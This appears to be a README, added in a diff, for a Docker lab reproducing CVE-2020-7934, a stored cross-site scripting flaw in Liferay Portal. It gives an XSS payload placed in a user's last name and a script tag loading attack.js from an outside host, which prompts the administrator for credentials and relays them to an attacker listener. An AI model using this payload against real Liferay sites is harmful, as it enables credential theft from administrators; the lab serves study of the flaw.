@@ -1,0 +1,27 @@
+# CVE 2020-7934
+
+## How to run CVE
+
+### Requirements
+1) docker
+### Remarks
+it's possible put the script attack online (given the js code ) http://yourjavascript.com/
+Our Js script online for the attack
+```html <script src="http://yourjavascript.com/920172199111/attack.js"></script> ```
+
+### Commands for configuration
+1) go to root folder of this project
+2) run "sudo docker-compose up --build"
+4) new terminal: run "docker inspect liferay"  ==> and copy the IPAddress value
+5) new terminal: run "python api_attacker.py" 
+5) open a browser and go to "http://IPAddress:8080" ==> you should get the liferay portal as response
+6) to stop and delete containers use "sudo docker-compose rm"
+### Istructions for the attack
+1) Register in liferay as a user, log in, and in the "available sites" section, join the "liferay" site.
+2) Change the "last name" in a JS script (directly (<script>alert("xss")</script>) or through a "src =" http ... "")
+2) Log in as admin liferay (username: test@liferay.com, password: test)
+3) Go to available sites and click on "liferay", the public page of this site will open.
+4) Go to the new page, a menu will open on the right, click on mermbership.
+5) Select the user registered in step 1. At that moment the script will be executed.
+5.1) In the script attack.js the page will ask the credentials.
+6) In the terminal of step 5 ( of Commands for configuration) it will be printed username/password inserted in 5.1 ( by admin ) )
